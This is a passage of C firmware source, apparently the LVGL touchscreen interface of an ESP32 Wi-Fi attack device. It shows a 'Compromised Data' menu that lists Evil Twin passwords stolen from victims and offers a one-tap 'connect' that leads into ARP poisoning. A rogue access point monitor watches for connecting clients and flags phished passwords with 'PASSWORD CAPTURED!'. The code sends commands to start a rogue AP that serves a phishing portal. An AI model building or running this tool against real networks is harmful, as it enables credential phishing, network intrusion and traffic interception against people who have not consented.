    lv_obj_center(gps_type_label);

    // ---- Status label ----
    ctx->wardrive_status_label = lv_label_create(ctx->wardrive_page);
    lv_label_set_text(ctx->wardrive_status_label, "Press Start to begin wardrive");
    lv_obj_set_style_text_font(ctx->wardrive_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->wardrive_status_label, lv_color_hex(0x888888), 0);

    // ---- Scrollable table container ----
    ctx->wardrive_table = lv_obj_create(ctx->wardrive_page);
    lv_obj_set_size(ctx->wardrive_table, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(ctx->wardrive_table, 1);
    lv_obj_set_style_bg_color(ctx->wardrive_table, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(ctx->wardrive_table, 0, 0);
    lv_obj_set_style_radius(ctx->wardrive_table, 8, 0);
    lv_obj_set_style_pad_all(ctx->wardrive_table, 8, 0);
    lv_obj_set_flex_flow(ctx->wardrive_table, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->wardrive_table, 6, 0);

    ctx->current_visible_page = ctx->wardrive_page;
}

//==================================================================================
// Compromised Data Menu
//==================================================================================

static lv_obj_t *compromised_data_page = NULL;

// Back button callback for compromised data sub-pages
static void compromised_data_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    show_compromised_data_page();
}

// Back to main from compromised data page - hide page and show tiles
static void compromised_data_main_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    tab_context_t *ctx = get_current_ctx();
    
    // Hide compromised data page
    if (ctx->compromised_data_page) {
        lv_obj_add_flag(ctx->compromised_data_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Tile click handler for compromised data sub-tiles
static void compromised_data_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Compromised data tile clicked: %s", tile_name);
    
    if (strcmp(tile_name, "Evil Twin Passwords") == 0) {
        show_evil_twin_passwords_page();
    } else if (strcmp(tile_name, "Portal Data") == 0) {
        show_portal_data_page();
    } else if (strcmp(tile_name, "Handshakes") == 0) {
        show_handshakes_page();
    }
}

// Show Compromised Data page with 3 tiles (inside current tab's container)
static void show_compromised_data_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists, just show it
    if (ctx->compromised_data_page) {
        lv_obj_clear_flag(ctx->compromised_data_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->compromised_data_page;
        compromised_data_page = ctx->compromised_data_page;
        ESP_LOGI(TAG, "Showing existing compromised data page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new compromised data page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->compromised_data_page = lv_obj_create(container);
    compromised_data_page = ctx->compromised_data_page;
    lv_obj_set_size(compromised_data_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(compromised_data_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(compromised_data_page, 0, 0);
    lv_obj_set_style_pad_all(compromised_data_page, 10, 0);
    lv_obj_set_flex_flow(compromised_data_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(compromised_data_page, 10, 0);
    
    // Header with back button and title
    lv_obj_t *header = lv_obj_create(compromised_data_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    
    // Back button (arrow style like other pages)
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, compromised_data_main_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Compromised Data");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_GREEN, 0);
    
    // Tiles container - vertical column, centered
    lv_obj_t *tiles = lv_obj_create(compromised_data_page);
    lv_obj_set_size(tiles, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(tiles, 1);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(tiles, 15, 0);
    lv_obj_clear_flag(tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create 3 tiles (stacked vertically, centered)
    create_tile(tiles, LV_SYMBOL_LIST, "Evil Twin\nPasswords", COLOR_MATERIAL_AMBER, compromised_data_tile_event_cb, "Evil Twin Passwords");
    create_tile(tiles, LV_SYMBOL_FILE, "Portal\nData", COLOR_MATERIAL_TEAL, compromised_data_tile_event_cb, "Portal Data");
    create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Handshakes", COLOR_MATERIAL_PURPLE, compromised_data_tile_event_cb, "Handshakes");
    
    // Set current visible page
    ctx->current_visible_page = ctx->compromised_data_page;
}

//==================================================================================
// Evil Twin Passwords Page
//==================================================================================

static void show_evil_twin_passwords_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    hide_all_pages(ctx);
    
    // If page already exists, just show it (but we need to refresh data, so delete and recreate)
    if (ctx->evil_twin_passwords_page) {
        lv_obj_del(ctx->evil_twin_passwords_page);
        ctx->evil_twin_passwords_page = NULL;
    }
    
    // Create page
    ctx->evil_twin_passwords_page = lv_obj_create(container);
    lv_coord_t scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(ctx->evil_twin_passwords_page, lv_pct(100), scr_height - 85);
    lv_obj_align(ctx->evil_twin_passwords_page, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(ctx->evil_twin_passwords_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(ctx->evil_twin_passwords_page, 0, 0);
    lv_obj_set_style_pad_all(ctx->evil_twin_passwords_page, 10, 0);
    lv_obj_set_flex_flow(ctx->evil_twin_passwords_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->evil_twin_passwords_page, 8, 0);
    
    ctx->current_visible_page = ctx->evil_twin_passwords_page;
    
    // Header
    lv_obj_t *header = lv_obj_create(ctx->evil_twin_passwords_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, compromised_data_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Evil Twin Passwords");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Status label
    lv_obj_t *status_label = lv_label_create(ctx->evil_twin_passwords_page);
    lv_label_set_text(status_label, "Loading...");
    lv_obj_set_style_text_font(status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(status_label, lv_color_hex(0x888888), 0);
    
    // Scrollable list container
    lv_obj_t *list_container = lv_obj_create(ctx->evil_twin_passwords_page);
    lv_obj_set_size(list_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 10, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 8, 0);
    
    // Flush RX buffer to clear any boot messages from ESP32C5
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush_input(uart_port);
    
    // Send UART command and read response
    uart_send_command_for_tab("show_pass evil");
    vTaskDelay(pdMS_TO_TICKS(1000));  // Wait for ESP32C5 to process and read from SD
    
    static char rx_buffer[2048];
    int total_len = 0;
    int retries = 10;
    int empty_reads = 0;
    
    while (retries-- > 0 && empty_reads < 3) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            empty_reads = 0;  // Reset on successful read
        } else {
            empty_reads++;  // Only break after 3 consecutive empty reads
        }
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "Evil Twin passwords response (%d bytes): %s", total_len, rx_buffer);
    
    // Reset entry storage
    evil_twin_entry_count = 0;
    memset(evil_twin_entries, 0, sizeof(evil_twin_entries));
    
    // Parse response - format: "SSID", "password"
    int entry_count = 0;
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL) {
        // Skip empty lines and command echo
        if (strlen(line) < 5 || strstr(line, "show_pass") != NULL) {
            line = strtok(NULL, "\n\r");
            continue;
        }
        
        // Parse "SSID", "password" format
        char ssid[64] = {0};
        char password[64] = {0};
        
        // Find first quoted string (SSID)
        char *p1 = strchr(line, '"');
        if (p1) {
            p1++;
            char *p2 = strchr(p1, '"');
            if (p2) {
                size_t len = p2 - p1;
                if (len < sizeof(ssid)) {
                    strncpy(ssid, p1, len);
                    ssid[len] = '\0';
                }
                
                // Find second quoted string (password)
                char *p3 = strchr(p2 + 1, '"');
                if (p3) {
                    p3++;
                    char *p4 = strchr(p3, '"');
                    if (p4) {
                        len = p4 - p3;
                        if (len < sizeof(password)) {
                            strncpy(password, p3, len);
                            password[len] = '\0';
                        }
                    }
                }
            }
        }
        
        if (strlen(ssid) > 0 && evil_twin_entry_count < EVIL_TWIN_MAX_ENTRIES) {
            // Store entry for later use (use snprintf to avoid truncation warnings)
            snprintf(evil_twin_entries[evil_twin_entry_count].ssid, sizeof(evil_twin_entries[0].ssid), "%s", ssid);
            snprintf(evil_twin_entries[evil_twin_entry_count].password, sizeof(evil_twin_entries[0].password), "%s", password);
            
            // Create clickable entry row
            lv_obj_t *row = lv_obj_create(list_container);
            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 8, 0);
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_COLUMN);
            lv_obj_set_style_pad_row(row, 4, 0);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
            lv_obj_add_event_cb(row, evil_twin_row_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)evil_twin_entry_count);
            
            lv_obj_t *ssid_lbl = lv_label_create(row);
            lv_label_set_text_fmt(ssid_lbl, "SSID: %s", ssid);
            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ssid_lbl, lv_color_hex(0xFFFFFF), 0);
            
            lv_obj_t *pass_lbl = lv_label_create(row);
            lv_label_set_text_fmt(pass_lbl, "Password: %s", password);
            lv_obj_set_style_text_font(pass_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(pass_lbl, COLOR_MATERIAL_AMBER, 0);
            
            evil_twin_entry_count++;
            entry_count++;
        }
        
        line = strtok(NULL, "\n\r");
    }
    
    lv_label_set_text_fmt(status_label, "Found %d password(s) - tap to connect", entry_count);
}

// Evil Twin row click callback - show connect popup
static void evil_twin_row_click_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    
    if (idx < 0 || idx >= evil_twin_entry_count) {
        ESP_LOGW(TAG, "Evil Twin: Invalid entry index %d", idx);
        return;
    }
    
    ESP_LOGI(TAG, "Evil Twin: Row clicked - SSID: %s", evil_twin_entries[idx].ssid);
    show_evil_twin_connect_popup(evil_twin_entries[idx].ssid, evil_twin_entries[idx].password);
}

// Show connect confirmation popup
static void show_evil_twin_connect_popup(const char *ssid, const char *password)
{
    // Store credentials for use in callback
    strncpy(arp_target_ssid, ssid, sizeof(arp_target_ssid) - 1);
    arp_target_ssid[sizeof(arp_target_ssid) - 1] = '\0';
    strncpy(arp_target_password, password, sizeof(arp_target_password) - 1);
    arp_target_password[sizeof(arp_target_password) - 1] = '\0';
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create overlay
    evil_twin_connect_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(evil_twin_connect_popup_overlay);
    lv_obj_set_size(evil_twin_connect_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(evil_twin_connect_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(evil_twin_connect_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(evil_twin_connect_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create popup container
    evil_twin_connect_popup_obj = lv_obj_create(evil_twin_connect_popup_overlay);
    lv_obj_set_size(evil_twin_connect_popup_obj, 320, LV_SIZE_CONTENT);
    lv_obj_center(evil_twin_connect_popup_obj);
    lv_obj_set_style_bg_color(evil_twin_connect_popup_obj, lv_color_hex(0x2A2A2A), 0);
    lv_obj_set_style_border_color(evil_twin_connect_popup_obj, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(evil_twin_connect_popup_obj, 2, 0);
    lv_obj_set_style_radius(evil_twin_connect_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(evil_twin_connect_popup_obj, 20, 0);
    lv_obj_set_flex_flow(evil_twin_connect_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(evil_twin_connect_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(evil_twin_connect_popup_obj, 15, 0);
    lv_obj_clear_flag(evil_twin_connect_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(evil_twin_connect_popup_obj);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Connect to Network?");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // SSID info
    lv_obj_t *ssid_label = lv_label_create(evil_twin_connect_popup_obj);
    lv_label_set_text_fmt(ssid_label, "SSID: %s", ssid);
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_width(ssid_label, lv_pct(100));
    lv_label_set_long_mode(ssid_label, LV_LABEL_LONG_WRAP);
    
    // Password info (masked)
    lv_obj_t *pass_label = lv_label_create(evil_twin_connect_popup_obj);
    lv_label_set_text_fmt(pass_label, "Password: %s", password);
    lv_obj_set_style_text_font(pass_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(pass_label, lv_color_hex(0xAAAAAA), 0);
    lv_obj_set_width(pass_label, lv_pct(100));
    lv_label_set_long_mode(pass_label, LV_LABEL_LONG_WRAP);
    
    // Description
    lv_obj_t *desc = lv_label_create(evil_twin_connect_popup_obj);
    lv_label_set_text(desc, "Connect and scan for hosts to perform ARP poisoning attack");
    lv_obj_set_style_text_font(desc, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(desc, lv_color_hex(0x888888), 0);
    lv_obj_set_width(desc, lv_pct(100));
    lv_label_set_long_mode(desc, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_align(desc, LV_TEXT_ALIGN_CENTER, 0);
    
    // Button row
    lv_obj_t *btn_row = lv_obj_create(evil_twin_connect_popup_obj);
    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_row, 20, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 100, 45);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, evil_twin_connect_popup_cancel_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_set_style_text_font(cancel_label, &lv_font_montserrat_14, 0);
    lv_obj_center(cancel_label);
    
    // Yes/Connect button
    lv_obj_t *yes_btn = lv_btn_create(btn_row);
    lv_obj_set_size(yes_btn, 120, 45);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, evil_twin_connect_popup_yes_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *yes_label = lv_label_create(yes_btn);
    lv_label_set_text(yes_label, "Connect");
    lv_obj_set_style_text_font(yes_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(yes_label, lv_color_hex(0x000000), 0);
    lv_obj_center(yes_label);
}

// Cancel button callback
static void evil_twin_connect_popup_cancel_cb(lv_event_t *e)
{
    (void)e;
    if (evil_twin_connect_popup_overlay) {
        lv_obj_del(evil_twin_connect_popup_overlay);
        evil_twin_connect_popup_overlay = NULL;
        evil_twin_connect_popup_obj = NULL;
    }
    // Clear stored credentials
    memset(arp_target_ssid, 0, sizeof(arp_target_ssid));
    memset(arp_target_password, 0, sizeof(arp_target_password));
}

// Yes/Connect button callback - go to ARP page in auto mode
static void evil_twin_connect_popup_yes_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Evil Twin: Connecting to %s with known password", arp_target_ssid);
    
    // Close popup
    if (evil_twin_connect_popup_overlay) {
        lv_obj_del(evil_twin_connect_popup_overlay);
        evil_twin_connect_popup_overlay = NULL;
        evil_twin_connect_popup_obj = NULL;
    }
    
    // Close Evil Twin passwords page
    if (compromised_data_page) {
        lv_obj_del(compromised_data_page);
        compromised_data_page = NULL;
    }
    
    // Set auto mode flag
    arp_auto_mode = true;
    
    // Show ARP Poison page (will auto-connect and scan)
    show_arp_poison_page();
}

//==================================================================================
// Rogue AP Attack Functions
//==================================================================================

// Rogue AP back button callback
static void rogue_ap_back_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Rogue AP: back button pressed, returning to scan page");
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Hide rogue AP page
    if (ctx->rogue_ap_page) {
        lv_obj_del(ctx->rogue_ap_page);
        ctx->rogue_ap_page = NULL;
        rogue_ap_page = NULL;
    }
    
    // Show scan page
    show_scan_page();
}

// Rogue AP password input focus callback - show keyboard
static void rogue_ap_password_focus_cb(lv_event_t *e)
{
    lv_obj_t *ta = lv_event_get_target(e);
    tab_context_t *ctx = get_current_ctx();
    if (ctx && ctx->rogue_ap_keyboard) {
        lv_obj_clear_flag(ctx->rogue_ap_keyboard, LV_OBJ_FLAG_HIDDEN);
        lv_keyboard_set_textarea(ctx->rogue_ap_keyboard, ta);
    }
}


// Rogue AP monitor task - watches UART for client connections and passwords
static void rogue_ap_monitor_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Rogue AP monitor task: NULL context!");
        vTaskDelete(NULL);
        return;
    }
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = uart_port_for_tab(task_tab);
    const char *uart_name = tab_transport_name(task_tab);
    
    static char rx_buffer[512];
    static char line_buffer[256];
    int line_pos = 0;
    
    int client_count = 0;
    char current_mac[20] = {0};
    
    ESP_LOGI(TAG, "[%s] Rogue AP monitor task started for tab %d", uart_name, task_tab);
    
    while (ctx->rogue_ap_monitoring) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(200));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "[%s] RogueAP: %s", uart_name, line_buffer);
                        
                        // Parse memory info: "[MEM] start_rogueap: Internal=200/257KB, DMA=185/241KB, PSRAM=7436/8192KB"
                        // Parse client connections: "AP: Client connected - MAC: XX:XX:XX:XX:XX:XX"
                        char *mac_ptr = strstr(line_buffer, "Client connected - MAC:");
                        if (mac_ptr != NULL) {
                            mac_ptr += 24;  // Skip "Client connected - MAC: "
                            while (*mac_ptr == ' ') mac_ptr++;
                            
                            char mac[20] = {0};
                            int j = 0;
                            while (mac_ptr[j] && mac_ptr[j] != ' ' && mac_ptr[j] != '\n' && j < 17) {
                                mac[j] = mac_ptr[j];
                                j++;
                            }
                            mac[j] = '\0';
                            snprintf(current_mac, sizeof(current_mac), "%s", mac);
                            client_count++;
                            
                            bsp_display_lock(0);
                            if (ctx->rogue_ap_status_label) {
                                char status[512];
                                snprintf(status, sizeof(status),
                                    "AP: Rogue AP Running\n\n"
                                    "SSID: %s\n"
                                    "Clients Connected: %d\n"
                                    "Last MAC: %s\n\n"
                                    "Waiting for password capture...",
                                    rogue_ap_ssid, client_count, current_mac);
                                lv_label_set_text(ctx->rogue_ap_status_label, status);
                            }
                            bsp_display_unlock();
                        }
                        
                        // Parse client count: "Portal: Client count = X"
                        char *count_ptr = strstr(line_buffer, "Portal: Client count =");
                        if (count_ptr != NULL) {
                            count_ptr += 22;  // Skip "Portal: Client count = "
                            int parsed_count = atoi(count_ptr);
                            if (parsed_count != client_count) {
                                client_count = parsed_count;
                                bsp_display_lock(0);
                                if (ctx->rogue_ap_status_label) {
                                    char status[512];
                                    snprintf(status, sizeof(status),
                                        "AP: Rogue AP Running\n\n"
                                        "SSID: %s\n"
                                        "Clients Connected: %d\n"
                                        "Last MAC: %s\n\n"
                                        "Waiting for password capture...",
                                        rogue_ap_ssid, client_count, current_mac);
                                    lv_label_set_text(ctx->rogue_ap_status_label, status);
                                }
                                bsp_display_unlock();
                            }
                        }
                        
                        // Parse password: "Portal password received: XXXX" or "Password: XXXX"
                        char *pass_ptr = strstr(line_buffer, "Portal password received:");
                        int skip_len = 25;  // Length of "Portal password received: "
                        
                        if (pass_ptr == NULL) {
                            // Try alternative pattern "Password: "
                            pass_ptr = strstr(line_buffer, "Password:");
                            skip_len = 9;  // Length of "Password: "
                        }
                        
                        if (pass_ptr != NULL) {
                            pass_ptr += skip_len;
                            while (*pass_ptr == ' ') pass_ptr++;
                            
                            char pass[128] = {0};
                            int j = 0;
                            while (pass_ptr[j] && pass_ptr[j] != '\n' && pass_ptr[j] != '\r' && j < 127) {
                                pass[j] = pass_ptr[j];
                                j++;
                            }
                            // Trim trailing whitespace
                            while (j > 0 && isspace((unsigned char)pass[j - 1])) {
                                pass[--j] = '\0';
                            }
                            
                            if (strlen(pass) > 0) {
                                bsp_display_lock(0);
                                if (ctx->rogue_ap_status_label) {
                                    char status[512];
                                    snprintf(status, sizeof(status),
                                        "PASSWORD CAPTURED!\n\n"
                                        "SSID: %s\n"
                                        "Clients Connected: %d\n"
                                        "Last MAC: %s\n\n"
                                        "Password: %s",
                                        rogue_ap_ssid, client_count, current_mac, pass);
                                    lv_label_set_text(ctx->rogue_ap_status_label, status);
                                    lv_obj_set_style_text_color(ctx->rogue_ap_status_label, COLOR_MATERIAL_GREEN, 0);
                                }
                                bsp_display_unlock();
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Rogue AP monitor task ended");
    rogue_ap_monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

// Rogue AP popup close callback - sends stop command
static void rogue_ap_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Rogue AP popup closed - sending stop command");
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Stop monitoring
    ctx->rogue_ap_monitoring = false;
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Delete overlay (popup is child, will be deleted too)
    if (ctx->rogue_ap_popup_overlay) {
        lv_obj_del(ctx->rogue_ap_popup_overlay);
        ctx->rogue_ap_popup_overlay = NULL;
        ctx->rogue_ap_popup = NULL;
        ctx->rogue_ap_status_label = NULL;
    }
}

// Start Rogue AP button callback
static void rogue_ap_start_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Rogue AP: Starting attack");
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;

    // Validate: Rogue AP requires exactly 1 selected network
    if (selected_network_count != 1) {
        ESP_LOGW(TAG, "Rogue AP requires exactly 1 network, selected: %d", selected_network_count);
        if (ctx->rogue_ap_status_label) {
            lv_label_set_text(ctx->rogue_ap_status_label, "Select exactly 1 network for Rogue AP");
            lv_obj_set_style_text_color(ctx->rogue_ap_status_label, COLOR_MATERIAL_RED, 0);
        }
        return;
    }
    
    // Get selected HTML file index from dropdown
    int html_idx = lv_dropdown_get_selected(ctx->rogue_ap_html_dropdown);
    
    if (html_idx < 0 || html_idx >= evil_twin_html_count) {
        ESP_LOGW(TAG, "Invalid HTML file selection");
        return;
    }
    
    // Get password from input (if not already known)
    if (strlen(rogue_ap_password) == 0 && ctx->rogue_ap_password_input) {
        const char *password_text = lv_textarea_get_text(ctx->rogue_ap_password_input);
        if (!password_text || strlen(password_text) == 0) {
            ESP_LOGW(TAG, "Password is empty");
            return;
        }
        strncpy(rogue_ap_password, password_text, sizeof(rogue_ap_password) - 1);
        rogue_ap_password[sizeof(rogue_ap_password) - 1] = '\0';
    }
    
    // Send select_html command (1-based index)
    char html_cmd[32];
    snprintf(html_cmd, sizeof(html_cmd), "select_html %d", html_idx + 1);
    ESP_LOGI(TAG, "[UART%d] Rogue AP: sending %s", uart_index_for_tab(current_tab), html_cmd);
    uart_send_command_for_tab(html_cmd);
    vTaskDelay(pdMS_TO_TICKS(100));

    // Send select_networks command (1-based index)
    int idx = selected_network_indices[0];
    if (idx >= 0 && idx < network_count) {
        char sel_cmd[32];
        snprintf(sel_cmd, sizeof(sel_cmd), "select_networks %d", networks[idx].index);
        uart_send_command_for_tab(sel_cmd);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Send start_rogueap command: start_rogueap SSID password
    char ap_cmd[256];
    snprintf(ap_cmd, sizeof(ap_cmd), "start_rogueap %s %s", rogue_ap_ssid, rogue_ap_password);
